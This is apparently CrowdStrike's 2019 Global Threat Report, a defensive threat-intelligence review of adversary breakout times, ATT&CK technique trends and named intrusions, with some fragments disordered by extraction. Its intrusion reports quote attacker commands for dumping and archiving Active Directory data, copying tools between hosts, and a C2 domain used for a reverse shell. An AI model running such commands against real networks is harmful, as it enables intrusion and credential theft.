FOREWORD

T

his year’s Global Threat Report: “Adversary Tradecraft
and the Importance of Speed,” addresses the quickening
pace and increasing sophistication in adversary tactics,
techniques and procedures (TTPs) over the past year —
and in particular, highlights the critical importance of speed in
staying ahead of rapidly evolving threats.

"In this year’s report,
we were able to
provide a more
granular examination
of breakout time by
clocking the average
speed of major nationstate actors. The report
compares the breakout
speeds of Russia,
China, North Korea,
Iran, and the combined
category of global
eCrime actors."

Last year, we introduced the concept of “breakout time” — the
window of time from when an adversary first compromises an
endpoint machine, to when they begin moving laterally across
your network. In this year’s report, we were able to provide a
more granular examination of breakout time by clocking the
average speed of major nation-state actors. The report compares
the breakout speeds of Russia, China, North Korea, Iran, and
the combined category of global eCrime actors. This and other
unique insights in the report can help organizations advance their
response objectives, depending on which adversary types they
are most likely to encounter in the year ahead.
The report also makes clear — in spite of some impressive
indictments against several named nation-state actors — their
activities show no signs of diminishing. Throughout 2018, eCrime
and nation-state adversaries collectively upped their game. A
few examples:
In diplomatic channels and the media, several nation-states
gave lip-service to curbing their clandestine cyber activities,
but behind the scenes, they doubled down on their cyber
espionage operations — combining those efforts with further
forays into destructive attacks and financially motivated fraud.
eCrime actors demonstrated new-found flexibility, forming
and breaking alliances and quickly changing tactics midcampaign to achieve their objectives. The shifting currents of
the underground economy — including the availability of new
TTPs-for-hire and the fluctuating value of Bitcoin — were all
contributing factors.
We also witnessed an increased focus on “Big Game Hunting,”
where eCrime actors combine targeted intrusions with
ransomware to extract big payoffs from large enterprise
organizations.

This report’s findings on adversary tradecraft and speed reflect
what many defenders already know: We are in a veritable “arms
race” for cyber superiority. However, there are some important
differences between an arms race in the cybersphere versus the
physical world: In cyberspace, any player can potentially become
a superpower. The capital costs are alarmingly low, compared to
funding a physical war machine. Even some of the world’s most
impoverished regions proved their ability to make a global impact
through cyber campaigns in 2018 — and this is one genie that is
not going back in the bottle.
At CrowdStrike, we experience on a daily basis the role
defenders play in the cyber arms race. As we introduce more
effective endpoint protection to the market, we raise the stakes
for determined adversaries. CrowdStrike has documented cases
where bad actors discover our products in the environment and
simply go away, presumably to ply their tradecraft on a more
vulnerable victim. In other cases, patient attackers simply go
back to the drawing board, adding new weapons to their cyber
arsenals as they probe for a novel, less defended point of entry.

INTRODUCTION

Nation-state adversaries
were continuously
active throughout 2018
— targeting dissidents,
regional adversaries and
foreign powers to collect
intelligence for decisionmakers.

In many respects, 2018 appeared to be a markedly different year than the
one before. Absent some of the high-profile events observed in 2017, such
as WannaCry and NotPetya, headlines in 2018 were defined instead by a
series of U.S. Department of Justice (DoJ) indictments against individuals
linked to named, state-sponsored adversaries. Possibly affected by these
public disclosures, ongoing tool development activity and changes in
tactics, techniques and procedures (TTPs) seem to indicate 2018 was a
transition year for many adversaries. One thing was clear: Law enforcement
efforts have not yet halted or deterred nation-state sponsored activities.
Nation-state adversaries were continuously active throughout 2018 —
targeting dissidents, regional adversaries and foreign powers to collect
intelligence for decision-makers:
North Korea (aka the Democratic People's Republic of Korea, or DPRK)
remained active in both intelligence collection and currency-generation
schemes, despite participating in diplomatic outreach.
Iran maintained focus on operations against other Middle Eastern and
North African (MENA) countries, particularly regional foes across the
Gulf Cooperation Council (GCC). Additionally, it is suspected that Iranian
adversaries are developing new mobile malware capabilities to target
dissidents and minority ethnic groups.
As for China, CrowdStrike® observed a significant rise in U.S. targeting,
likely tied to increased tensions between the two countries.
Russian adversaries were active across the globe in a variety of
intelligence collection and information operations.
Other nation-state adversaries tracked by CrowdStrike but not prominently
featured in this report include:
Adversaries linked to Pakistan and India maintained an interest in regional
affairs with a rise in activity on the Indian subcontinent, observed in the
summer of 2018.

2019 GLOBAL THREAT REPORT
ADVERSARY TRADECRAFT AND THE IMPORTANCE OF SPEED

The most prominent
trend in eCrime for 2018
was the continued rise
of “Big Game Hunting,”
which combines targeted,
intrusion-style TTPs
with the deployment of
ransomware across a
large organization, all
in pursuit of a bigger
financial payoff.

7

The Vietnam-based adversary OCEAN BUFFALO appeared to focus on
domestic — possibly internal law enforcement — operations; however,
CrowdStrike has also identified the possible targeting of Cambodia, as
well as activity against the manufacturing and hospitality sectors.
Recent technical analysis, as well as the reported zero-day use of CVE2018-8174, suggests the South Korean-based adversary SHADOW
CRANE continues to actively develop its toolkit. The target scope of
SHADOW CRANE’s campaigns appears to primarily focus on victims in
China, Japan, South Korea, Russia, India and the DPRK — particularly
those involved in the government, think tanks, media, academia and nongovernment organization (NGO) sectors.
The eCrime adversaries tracked by CrowdStrike Intelligence conducted
a variety of criminal operations, including crimeware distribution, banking
Trojans, ransomware, point of sale compromises and targeted spearphishing campaigns:
The most prominent trend in eCrime for 2018 was the continued rise of
“Big Game Hunting,” which combines targeted, intrusion-style TTPs with
the deployment of ransomware across a large organization, all in pursuit
of a bigger financial payoff. BOSS SPIDER (Samas, SamSam), INDRIK
SPIDER (Dridex) and GRIM SPIDER (Ryuk) all raked in huge profits in
these campaigns.
Additional evidence of a changing eCrime ecosystem came from prolific
ransomware-as-a-service (RaaS) adversary PINCHY SPIDER (GandCrab)
and the solidification of MUMMY SPIDER (Emotet) as a professional
malware distribution operation.
Meanwhile, targeted eCrime adversaries COBALT SPIDER (Cobalt Group)
and CARBON SPIDER (Carbanak) have remained active, despite arrests
of individuals linked to their operations.
In the following sections, the CrowdStrike Intelligence, Falcon OverWatch™
managed hunting and the CrowdStrike Services teams present selected
analysis that highlights the most significant events and trends in the past
year of cyberthreat activity. Analysis of incidents referenced in this report
demonstrates how threat intelligence, proactive hunting and swift proactive
countermeasures can provide a deeper understanding of the motivations,
objectives and activities of these actors, and how to use that information to
better defend valuable data in the future.

METHODOLOGY
The information in this report was compiled using the following resources:

CROWDSTRIKE INTELLIGENCE
The CrowdStrike Intelligence team provides in-depth and historical
understanding of adversaries, their campaigns and their motivations. The global
team of intelligence professionals track 116 adversaries of all types, including
nation-state, eCrime and hacktivist actors. The team analyzes adversary
tools, tactics and procedures (TTPs) to deliver in-depth, government-grade
intelligence to enable effective countermeasures against emerging threats.

FALCON OVERWATCH
CrowdStrike Falcon OverWatch provides proactive threat hunting conducted
by a team of experienced threat hunters providing 24/7 coverage on behalf
of CrowdStrike customers. In 2018, OverWatch identified and helped stop
more than 30,000 breach attempts, employing expertise gained from daily
“hand-to-hand combat” with sophisticated adversaries. The OverWatch team
works to identify hidden threat activity in customers’ environments, triaging,
investigating and remediating incidents in real time.

CROWDSTRIKE THREAT GRAPH™
As the brains behind the CrowdStrike platform, Threat Graph is a massively
scalable, cloud-based graph database model custom built by CrowdStrike.
It processes, correlates and analyzes petabytes of real-time and historical
data collected from over one trillion events per week across 176 countries.
The Threat Graph architecture combines patented behavioral pattern
matching techniques with machine learning and artificial intelligence to track
the behaviors of every executable across CrowdStrike’s global customer
community. This combination of methodologies enables the identification and
blocking of previously undetectable attacks, whether or not they use malware.

CROWDSTRIKE SERVICES
This report references the CrowdStrike Services organization and its
annual report, the "CrowdStrike Services Cyber Intrusion Casebook 2018,"
which recounts real-life client incident response (IR) engagements handled
by the Services team. In addition to hands-on IR services conducted by
its team of professional investigators, CrowdStrike Services provides
proactive services such as cybersecurity maturity assessments, IR policy
and playbook development, tabletop exercises, red teaming operations
and compromise assessments. Response and remediation services are
conducted by highly experienced IR experts who investigate breaches to
determine how attackers accessed a client’s environment; mitigate attacks
and eject intruders; and analyze attacker actions and provide clients with
actionable guidance to prevent future adversary access.

ADVERSARY TRADECRAFT AND THE IMPORTANCE OF SPEED

BREAKOUT TIME:
METHODOLOGY AND LIMITATIONS OF THE FINDINGS

While Chinese-affiliated
groups had an average
breakout time of four
hours, there were
groups within China
that were considerably
faster. Similarly, some
criminal groups were
extremely fast at
breaking out, but the
average was dragged
down by other groups
that were slower.

The dataset used for producing this year’s breakout time analysis was
based on intrusions that occurred during 2018 among the organizations
CrowdStrike works with. CrowdStrike’s customer base is large and
diverse, and represents every major industry, including companies and
government agencies with deployments across 176 countries. However,
this large dataset is not universal, and it is possible that researchers
looking at other datasets may arrive at different measurements
for breakout time. CrowdStrike researchers were only able to rank
adversaries for which there was live intrusion data based on their
visibility and, therefore, it was impossible to arrive at any conclusions
about capabilities for other actors that are also undoubtedly executing
cyber operations. Hopefully, future reports will be able to expand the list
of adversaries tracked, as more data on them becomes available.
It’s important to note that this dataset only incorporated intrusions
where CrowdStrike had confident attribution to a threat actor and
where lateral movement was successful by that actor (vs. where they
may have been prevented from moving laterally by the technology or
people at the customer site). This likely introduced biases that the
authors want to recognize in this report.
In order to make it easier to draw conclusions from the data, a decision
was made to aggregate breakout times across adversaries associated
with specific nation-states and across all criminal groups CrowdStrike
had detected. This decision entailed some internal debate. On one
hand, it is easier for people to consume data based on countries, versus
numerous nation-state actors that may be affiliated with that country;
on the other hand, you lose some of the information in the average
metric around the fact that certain groups within nation-states are
more skillful than others. Consider this: While Chinese-affiliated groups
had an average breakout time of four hours, there were groups within
China that were considerably faster. Similarly, some criminal groups
were extremely fast at breaking out, but the average was dragged down
by other groups that were slower. In the future, CrowdStrike hopes to
expand the reporting and provide more granular measurements beyond
just the averages.

2019 GLOBAL THREAT REPORT
ADVERSARY TRADECRAFT AND THE IMPORTANCE OF SPEED

CrowdStrike researchers
believe — based on
extensive experience
and visibility — that as
defenders get better
at hunting for and
identifying intrusions,
it has become more
important for threat
actors to raise their game
and try to accomplish
their mission as rapidly
as possible prior to being
detected and thwarted.

It is also important to recognize that not all adversaries may have an
objective to be as fast as possible at breaking out. It is possible that for
a certain mission, breakout speed may not be the primary objective, or
there may have been a handoff to a different intrusion team following the
initial compromise, which can also cause significant delays before lateral
movement is accomplished. However, CrowdStrike researchers believe
— based on extensive experience and visibility — that as defenders
get better at hunting for and identifying intrusions, it has become more
important for threat actors to raise their game and try to accomplish their
mission as rapidly as possible prior to being detected and thwarted.
This ranking is also not necessarily an indication of which adversary
represents the biggest threat. For example, it doesn’t account for volume
of activity — just their speed of lateral movement within the network.
Slow adversaries can still cause tremendous damage if they have the
motivation to do so.
There are many different ways to look at the dataset. CrowdStrike has
attempted to outline some of the assumptions and limitations, but there
are others that researchers may have not thought of yet. CrowdStrike
welcomes constructive feedback from the industry on how to make
these measurements better and more actionable in the future. This is
only a start, and not the end of these types of exercises, and it is hoped
that others will come forward with their own measurements of breakout
time by adversaries, as well as perhaps other useful metrics to track and
measure their tradecraft and capabilities.
One of the most important implications of this data, however, is that it is
an indication of how fast defenders have to be in order to stop a breach
from one of these adversaries that is likely to target them. They may have
more time if they are dealing with a threat actor who tends to be slower
at lateral movement, but they can’t waste a second when dealing with
fast-moving actors, such as those affiliated with the Russian government.
CrowdStrike hopes this research spurs more analysis and evaluation
about the implications of tracking breakout time, and how to measure
sophistication and capabilities of adversary groups.

THREAT LANDSCAPE OVERVIEW

GOING BEYOND
MALWARE
Malware continues to loom as a primary feature of the threat
landscape, but it is often only the precursor to an attack, not the
ultimate objective. Initial intrusion leads to more sophisticated and
stealthy techniques, such as “living off the land” tradecraft that uses
legitimate tools already present on the target system to accomplish
adversary objectives. Using insights gleaned from the CrowdStrike
Threat Graph, this report attempts to bring focus to what happens in
the threat environment “beyond malware.”

CROWDSTRIKE THREAT GRAPH
The CrowdStrike Threat Graph is the brains behind the CrowdStrike Falcon®
platform. Falcon endpoint agents are deployed on customer machines in more
than 176 different countries and capture more than 240 billion events every 24
hours — more than the number of tweets Twitter processes in an entire year.
Using powerful graph analytics to correlate more than a trillion events per
week in real time, the Threat Graph draws links between security telemetry
across the global CrowdStrike Falcon agent community to immediately detect
and prevent adversary activity — at scale and with unprecedented speed.

AN OVERVIEW OF TACTICS
AND TECHNIQUES OBSERVED IN 2018
The following section of the report contains statistics taken directly from CrowdStrike
Threat Graph telemetry profiling recent attack types and their targets.

BREAKOUT TIME AND LATERAL MOVEMENT SPEED
Last year’s Global Threat Report highlighted an important new metric
CrowdStrike is tracking — “breakout time” — that measures the speed with
which adversaries accomplish lateral movement in the victim environment
after their initial compromise. Breakout time is important because it
represents the time limit for defenders to respond to and contain or
remediate an intrusion before it spreads widely in their environment and
leads to a major breach.

ADVERSARY TRADECRAFT AND THE IMPORTANCE OF SPEED

This year, the CrowdStrike team decided to dive deeper into breakout
time and calculate it for attributed incidents, to determine the speed of
major adversaries whose intrusions the team attributed in 2018. Speed is
essential in cybersecurity — for both offense and defense. In many ways, it
is not the sophistication of the tools — which can be bought or stolen from
others — that determines the capability of the adversary, but rather their
operational tradecraft and how rapidly they can achieve their objectives in a
target network. Figure 2 shows the breakout time of major nation-state and
criminal actors, calculated over the course of 2018.
It is quite remarkable to see that Russia-based threat actors are almost
8 times as fast as their speediest competitor — North Korea-based
adversaries, who themselves are almost twice as fast as intrusion groups
from China. While certainly not the only metric to judge sophistication
by, this ranking by breakout time is an interesting way to evaluate the
operational capabilities of major threat actors. It is also useful for defenders
who want to use it to benchmark the speed of their average time-to-detect,
time-to-investigate and time-to-remediate metrics (collectively known as the
“1-10-60 rule,” these key defensive indicators are explained more fully in the
Global Threat Predictions and Recommendations section). Organizations
can adjust their target response times to meet their individual needs, based
in part on which adversaries types they are most likely to confront in their
given business sector and regional focus.
The overall average breakout time that CrowdStrike observed in 2018
across all intrusions and threat actors was 4 hours 37 mins, a substantial
increase from 1 hour and 58 minutes tracked in 2017. A variety of factors
may have contributed to this increase, including a rise in intrusions from
slower-moving adversaries, as well as more organizations deploying nextgeneration endpoint security technologies that are more effective at
detecting and stopping intrusions than legacy antivirus.

Organizations can adjust their target response times
to meet their individual needs, based in part on which
adversaries types they are most likely to confront in
their given business sector and regional focus.

BEYOND MALWARE
The 2018 CrowdStrike telemetry did not show a distinct shift in the balance
between malware and malware-free threats compared to 2017. CrowdStrike
analysis continues to identify malware as a dominant method used by
various types of attackers for initial infiltration. The ultimate methods and
objectives of malware can range from deploying basic bots for use in
denial-of-service campaigns, to more directed objectives such as collecting
cryptocurrencies through unauthorized mining. Other more nefarious
malware, such as the TrickBot banking Trojan, is used to steal login
credentials to banking sites.
Figure 3 compares malware and malware-free attacks from the 2018
CrowdStrike telemetry. The attack types are defined as follows:
Malware attacks: These are simple use cases where a malicious file
is written to disk and Falcon detects the attempt to run that file, then
identifies and/or blocks it.
Malware-free attacks: CrowdStrike defines malware-free attacks as
those in which the initial tactic did not result in a file or file fragment being
written to disk. Examples of this include attacks where code executes
from memory or where stolen credentials are leveraged for remote logins
using known tools.

Notable shifts in 2018 versus 2017: The media industry jumped to the top
of the charts, with approximately 80 percent malware-free attacks, versus
approximately 64 percent in 2017. In addition, the technology, academic and
energy sectors all saw dramatic increases in malware-free attacks in 2018.

MALWARE-FREE ATTACKS BY REGION
Using sample groupings from the CrowdStrike Threat Graph, this year’s
report includes the types of activity observed using CrowdStrike global

elsewhere in this report.
For instance, CrowdStrike Intelligence observed an increase in eCrime
malware-based activity in Central and South America. Figure 5, comparing
malware versus malware-free attacks per region, shows that a larger
percentage of malware-based attacks occurred in those same regions, thus
aligning with the findings of the CrowdStrike Intelligence team.

GLOBAL ATT&CK TECHNIQUE TRENDS

Ransomware

Registr

Successful cyberattacks do not end with an initial intrusion, regardless of
whether they’re perpetrated via malware or malware-free attack vectors.
Each attack has an ultimate objective, such as theft of data or computing
resources, and the attack typically requires multiple steps along the way
to reach that objective. In 2018, the cybersecurity industry saw the rapid
adoption of the MITRE ATT&CK™ framework to describe the tactics and
techniques — from initial access to exfiltration — in a standardized manner.
CrowdStrike uses MITRE ATT&CK extensively in its telemetry and reporting
to more completely understand and describe cyberthreats. The following
section delves into the types of techniques CrowdStrike observed in its
telemetry, and maps them to the ATT&CK framework.
In 2018, CrowdStrike observed a substantial use of “scripting” techniques
in attacks, as well as the increased use of techniques intended to hide
or obscure attacker behaviors. The CrowdStrike team surmises that as
endpoint protection solutions are becoming increasingly adept at finding
and stopping malicious behaviors, attackers are forced to incorporate
steathier measures into their tradecraft.

OVERWATCH ATT&CK HEAT MAP
Actions involved in
discovery are easy to
miss, as the attacker
is typically using
the same standard
commands and
tools that are often
used for legitimate
administration
purposes.

In the Falcon OverWatch 2018 Mid-Year Review report, CrowdStrike
provided an adversary technique heat map showing targeted intrusion
activity observed during the first half of the year. The heat map included in
this report (Figure 8) builds on that previous analysis, displaying technique
usage OverWatch observed in targeted intrusion cases during the entire
year. As compared to the analysis in the Mid-Year Review, there has
not been a significant shift in the most common adversary tactics and
techniques. However, some key observations from the new OverWatch
ATT&CK heat map include:
A very high prevalence of scripting techniques, including PowerShell,
command-line interface, and related techniques. Once attackers obtain
an initial foothold, the next steps of discovery, persistence, and lateral
movement often require a human touch. This represents a key channel that
defenders must monitor for effective protection against today’s threats.
After attackers obtain their initial foothold, their first order of business
is to get oriented within their newly accessed environment before
determining next steps toward their objective. This behavior very
commonly shows itself via a wide range of discovery techniques. Actions
involved in discovery are easy to miss, as the attacker is typically using
the same standard commands and tools that are often used for legitimate
administration purposes. However, watching for unusual clusters of
discovery activities, at unusual times, can lead to success in early
detection of malicious actors.
Adversaries are frequently seen using valid account credentials across
the attack lifecycle. Credentials are typically obtained via successful
phishing, brute force or credential dumping methods. Use of multifactor
authentication is highly recommended to effectively thwart these
techniques.
The number of techniques listed under Defense Evasion continues to
grow, as attackers are forced to adopt more sophisticated techniques in
their attempts to hide from more advanced endpoint protection solutions.

STATE-SPONSORED ADVERSARIES
In 2018, CrowdStrike identified state-sponsored (targeted) intrusion activity from
across the globe. The following sections provide an overview of observed incidents
attributed specifically to adversaries in China, Russia, Iran, and the DPRK (Democratic
People’s Republic of Korea, or North Korea). Additionally, CrowdStrike Intelligence
continues to observe activity from the Republic of Korea (RoK, or South Korea),
Vietnam, India, and Pakistan. Of the 81 named state-sponsored targeted intrusion
adversaries tracked by CrowdStrike Intelligence, 28 were active in 2018. Additional
campaigns have been identified that are in the process of being fully or partially
attributed. In total, the activities summarized below have been assessed as likely statesponsored operations supporting intelligence collection, military requirements and — in
the case of certain DPRK operations — currency generation.

Although 2018 lacked the high-profile ransomware and pseudo-ransomware
incidents, like the WannaCry and NotPetya operations of 2017, CrowdStrike

GLOBAL TREND
TELECOM-RELATED TARGETING
Throughout 2018, CrowdStrike Intelligence identified several targeted
intrusion campaigns with a demonstrated focus on the telecommunications
(telecom) sector, which have manifested as follows:
Directly targeting organizations in the telecom sector
Compromising vulnerable telecom equipment
Using lures referencing telecom services
This trend likely supports state-sponsored espionage actors as they seek to
gain access to a broad customer base that relies on telecom services.

CHINA: EVIDENCE OF UPSTREAM TARGETING
Several suspected China-based actor groups were linked to telecom targeting,
with some incidents demonstrating a specific interest in using telecom access
or lures to enable operations against government sector targets in Asia (see
Table 2). The targeting of the telecom sector is historically within the scope
of several Chinese adversaries; however, the number of operations affecting
this sector, or using lures referencing telecom services, suggests an increase
in China-based cyber espionage operations on a larger scale, and supports
previous assessments that these adversaries regularly engage in upstream
targeting. The access gained by compromising entities in the telecom
sector supports the subsequent targeting of their customers, which include
government entities. The use of telecom-related lures is almost certainly
socially engineered to take advantage of the reliance on communications
technology and the high degree of trust placed in the operators of the
networks that support businesses and government organizations.

IRAN DIRECTLY TARGETS TELECOM SECTOR
Access to a nationwide
telecom provider could
support intelligence
collection objectives.

CrowdStrike Intelligence identified two instances of Iranian adversaries
directly targeting the telecom sector in 2018. In June 2018, STATIC
KITTEN leveraged its bespoke NTSTATS malware against a Saudi Arabiabased telecom company; both Saudi Arabia and the telecom sector are
part of this adversary’s target scope. Then, in November 2018, Falcon
OverWatch observed HELIX KITTEN activity at a customer in the telecom
sector, signaling a shift in the target scope for this adversary. Access
to a nationwide telecom provider could support intelligence collection
objectives, specifically the bulk collection of personally identifiable
information (PII), SMS and call logs, and geolocation data. This operation
could also enable the subsequent targeting of the company’s customers,
and possibly destructive attacks.

RUSSIA’S COMPROMISE OF TELECOM EQUIPMENT
In May 2018, the U.S. Department of Justice (DoJ) issued a press release
detailing actions performed by the FBI Cyber Division to disrupt the
VPNFilter botnet. Both the affidavit and public reporting link VPNFilter to
Russia’s Main Intelligence Directorate (GRU). VPNFilter largely targeted
small office/home office (SOHO) routers, which which are typically
vulnerable due to the lack of security updates and/or inconsistent
monitoring. The network-sniffing functionality of the malware suggests
that it could be used to perform reconnaissance on network nodes
connected to infected devices, in preparation for further compromise.
Although not linked to a named Russia adversary, CrowdStrike
Intelligence assesses that such a use for this malware is consistent with
previously observed Russian state-sponsored activity, which has used
the compromise of telecom equipment to enable military and intelligence
operations. For example, in 2017 and 2018, BERSERK BEAR conducted
reconnaissance and exploitation operations against companies
developing communications equipment.

OVERWATCH
INTRUSION
REPORT
Unidentified State-Sponsored Adversaries:
Targeting Linux Networks at Telecom
Providers
Falcon OverWatch has been analyzing a long-term intrusion involving a
deeply-embedded, persistent adversary targeting a telecom company. The
threat actors repeatedly attacked Linux systems within the company’s
network, though Windows machines were also victimized at times.
In this attack, the adversary had previously compromised an internal Linux
host by unknown means, prior to OverWatch coverage, and were using the
host as its primary staging point. The adversary used this beachhead for
hosting tools to enable further penetration throughout the victim’s network,
including a port scanner and a password brute-forcing tool. From there,
the actor performed internal network scanning, remote system discovery
and host enumeration. OverWatch also observed the actor making use of
base64-encoded Perl commands to collect various files, including (but not
limited to) configuration files and the contents of bash history files. These
files were then archived using the GNU tar utility as part of staging, prior to
exfiltration.
In addition, the actor implemented an open-source Perl-based Socks5
proxy to further pivot through the internal network. OverWatch also found
that the adversary modified and timestomped SSH private key files to
help cover its tracks. Additional analysis discovered daily scripted routing
used to harvest data from a customer database, facilitated by use of a recompiled open-source SSH tunneler.
Later, the same actor returned using valid credentials. The operator
attempted to re-establish persistence by installing a backdoored version of
the SSH client and server.

This image from the Falcon UI displays details of the backdoored SSH process,
masquerading as a legitimate SSH daemon process “SSHD” (highlighted in blue in the
process tree). Note the “Global Prevalence” is categorized as “Unique,” indicating that this
binary had not been seen previously in the CrowdStrike global dataset except within this
victim’s network.

The operator proceeded to gather information on system state, security
configurations and user activity logs. Its reconnaissance included reading the
bash history of several users. A bash history file usually records the previous
500 commands a user has typed, albeit without any timestamps. This can
prove highly valuable to an attacker if the user has entered any sensitive
information, such as usernames and passwords, via the command-line.
Later, the adversary packaged a large number of targeted host files into an
archive, to stage for exfiltration, as shown in the graphic below:

While analyzing the intrusion, OverWatch noted the adversary went to
considerable lengths to remove forensic evidence. This included a concerted
effort to cover its tracks by deleting temporary files, tampering with and
replacing logs, and timestomping modified files. The actor also installed
malicious versions of Linux administrative binaries4 that filtered out the
attacker’s malicious IP address ranges, network ports, files, directories
and running processes. In addition, many of its backdoor tools used names
that masqueraded as legitimate system processes. Despite this deeply
embedded adversary’s extensive defense evasion efforts, Falcon endpoint
protection was pivotal in keeping local responders well informed.

on how OverWatch has
seen adversaries extend
persistence by modifying
system binaries such as
SSH, see the recent blog
post “Adversary Extends
Persistence by Modifying
System Binaries.”

Later in 2018, Falcon OverWatch observed a similar attack at another
telecommunications company in which Linux systems were also targeted. In
this case, the actor used the Linux kernel exploit known as Dirty COW (CVE2016-5195) in order to escalate its privileges and modify the SSH client and
SSHD daemon binaries. The actor extracted the necessary code from archives
copied to the target system, and recompiled the binaries with new functions that
captured credentials. The SSHD binary was also backdoored with a function
that allowed the actor universal access based on a specific password.

CHINA
CrowdStrike
Intelligence has
observed an increasing
operational tempo
from China-based
adversaries.

The downturn in Chinese targeted intrusion activity observed in the
wake of the 2015 agreement between China and the U.S. with regards to
commercially-motivated cyber espionage appears to have been reversed.
Over the last year, CrowdStrike Intelligence has observed an increasing
operational tempo from China-based adversaries, which is only likely to
accelerate as Sino-U.S. relations continue to worsen. In June 2018, the
Trump administration announced 25 percent tariffs on more than $50
billion USD worth of Chinese goods. These tariffs have targeted industries
such as technology, manufacturing and pharmaceuticals in an effort to
cripple strategic plans laid out in the Chinese government’s Made in China
2025 Plan (MIC 2025), an initiative that outlines Beijing’s plans to become
a global leader in key manufacturing areas. Many of the strategic goals
outlined in the plan are likely predicated on specific intelligence collection
requirements, which CrowdStrike Intelligence has noted as the primary
basis for China-based cyber operations.
Although Beijing toned down its rhetoric later in 2018 and reduced mention of
the MIC 2025 in state media, these requirements are essential to decreasing
Chinese reliance on critical foreign components — especially in technology,
energy, and healthcare — and it is highly unlikely they will be abandoned. Not
only does Beijing see decreasing dependence on foreign goods as paramount,
but the continuation of its Belt and Road Initiative (BRI) seeks to make much of
the world’s trade routes and infrastructure dependent on Beijing.

involved suspected targeting of Cambodia.

LOTUS
PANDA

In 2018, CrowdStrike observed limited activity from
LOTUS PANDA, possibly stemming from public
reporting under the industry name “Thrip.” However,
evidence suggests this adversary targeted Hong Kong

CrowdStrike Intelligence technical analysis suggests
that in mid-2018 this adversary deployed the publicly
available QuasarRAT using a custom loader, dubbed
StoneNetLoader. In late 2018, STONE PANDA was
the subject of public disclosures, both officially in
connection to an U.S. DoJ indictment and unofficially
from the open-source reporting of IntrusionTruth.

VIXEN

a Russian-language decoy document with content
related to South and East Asia economic statistics.

EMISSARY

WICKED PANDA
Joining the Crowd Targeting
Hospitality Sector
The CrowdStrike 2018 Global Threat Report highlighted the hospitality
sector as one that adversaries had been targeting heavily in 2017. The
trend continued in 2018. In October 2018, OverWatch identified adversary
activity against another global hospitality victim. The actor compromised
a running SQL Server process and attempted to upload and execute an
open-source PowerShell Empire implant, which was intended to open a
reverse TCP shell to the adversary-controlled domain voda.dns04[.]com.
However, Falcon endpoint protection blocked the PowerShell command.
The actor also used PowerShell to deploy a simple ASPX web shell, and
carried out some basic reconnaissance showing interest in a number of
web server directories, configuration files, and a specific user account.
The adversary later returned and used the echo and certutil utilities
alongside PowerShell to write several additional files to disk, including:
A suspected Cobalt Strike implant, capable of communicating via both
DNS and HTTPS
A VBScript base64 decode routine, possibly taken from the
Rex Exploitation Framework
A known ASPX web shell sourced from a
Chinese-language GitHub project
Two binaries related to the Derusbi family of Remote Access

OVERWATCH
INTRUSION
REPORT
The operator attempted to use their Cobalt Strike implant to harvest
credentials from the running LSASS process, but this was also blocked
by Falcon. Similarly, the Derusbi malware did not execute successfully.
The web shell file was also written to a mapped network drive
associated with a second host, likely to facilitate lateral movement;
however, no actor behavior was observed on the second machine.
Further analysis found multiple overlaps between this intrusion and
the adversary tracked as WICKED PANDA. TTP overlap included use
of Derusbi, Cobalt Strike and GitHub for facilitating the intrusion. The
command and control (C2) infrastructure also had links to WICKED
PANDA. For example, the C2 domain used for the PowerShell Empire
implant in this case (voda.dns04[.]com) shows resolved IP address
overlap with the domain money.moneyhome[.]biz, which CrowdStrike
Intelligence previously attributed to WICKED PANDA with medium
confidence, when it was used in intrusions against the mining sector
earlier in 2018. These two domains resolved to the IP address
67.229.97[.]229 within weeks of each other in late September and
early October 2018. While OverWatch has identified WICKED PANDA
attacking victims in other sectors such as technology, manufacturing,
and mining, this is the first incident in which CrowdStrike has linked
WICKED PANDA to hospitality sector targeting.

JUDGMENT PANDA:
Automating Credential Harvesting
Using Scheduled Tasks
In the fall of 2018, a North American oil and gas company called in the
CrowdStrike Services incident response team after receiving a third-party
tip regarding a possible breach in its environment. Falcon OverWatch threat
hunting, enabled by Falcon endpoint protection, subsequently helped
uncover an extensive intrusion attributed to JUDGMENT PANDA and likely
stemming originally from a phishing attack.
Specifically, OverWatch found that an actor had established a VPN
session to a victim host using valid credentials. This access was used to
carry out reconnaissance and credential harvesting by using ProcDump
to dump memory from the LSASS process. Though these attempts were
unsuccessful, the actor also used the native Microsoft LDIFDE tool to
enumerate Active Directory information, which was then archived for
exfiltration using the following commands:
"C:\Windows\system32\ldifde.exe" -f -n eprod.ldf
"C:\users\public\7za.exe" a 1.7z eprod.ldf

Continuing to use valid credentials, the actor then moved laterally by
connecting to Windows shares on remote hosts and copying tools between
systems. Examples of such commands include the following:
copy \\client\c$\aaaa\procdump64.exe
copy \\client\c$\aaaa\netsess.exe
copy \\client\c$\aaaa\7za.exe
copy .\1.7z \\client\c$\aaaa\

During the following week, the actor continued to move laterally throughout
the network, using VPN sessions and leveraging Server Message Block
(SMB) connections to test credentials. It accessed email and performed
further discovery using native tools, including using local.exe and global.exe,
which enumerate user groups. OverWatch also observed use of the joeware
user information tool. The actor leveraged NBTScan to identify additional
hosts on the network and also made copies of registry hives to harvest more
credentials, archiving them for exfiltration using the RAR archive utility.
Eventually, the actor created scheduled tasks on multiple hosts to facilitate
credential harvesting. The scheduled tasks executed a batch script that
would harvest registry data and launch ProcDump to again dump memory
from LSASS in an attempt to gather credentials.
At that point of the intrusion, CrowdStrike Services began coordinated
remediation efforts to remove the actor from the network, using the Falcon
platform to block hashes of the actor’s known toolset and to change
credentials that were known to be compromised. No further activity has
been observed since that time.

to focus on targeting
Ukrainian government,
law enforcement and
military entities.

Russian targeted intrusion activity continued to be prolific in 2018.
CrowdStrike’s ongoing discovery and analysis of new tools in use by Russiabased adversaries continue to highlight how resourceful and, ultimately,
how flexible these actors are against a broad target set. Technical analysis
of FANCY BEAR and VENOMOUS BEAR tools suggests these adversaries
are pursuing a plan to diversify their tools. VOODOO BEAR’s 2018 activity
— although missing the high-profile deployment of ransomware seen in 2017
— still features the use of destructive and disguised malware.
CrowdStrike Intelligence also tracked suspected Russia-based campaigns,
including the previously mentioned VPNFilter activity that, when combined
with attributed targeted intrusion incidents, suggests Russian adversaries
engaged in even more extensive operations in 2018. Although unattributed
to a named Russian adversary, these incidents are aligned with strategic
Russian goals. For example, evidence surfaced in May 2018 that an
intrusion campaign was targeting entities involved with the analysis of nerve
agent samples from the Salisbury, England attack on a former Russian
intelligence officer and his daughter in March 2018 — an attack that was
largely attributed to Russian GRU officers and which generated significant
geopolitical controversy.
Another campaign, assessed with medium to high confidence to be
associated with Russia-based actors, has been active throughout 2018
(since at least mid-April) and appears to focus on targeting Ukrainian
government, law enforcement and military entities. Tracked as SpiceyHoney
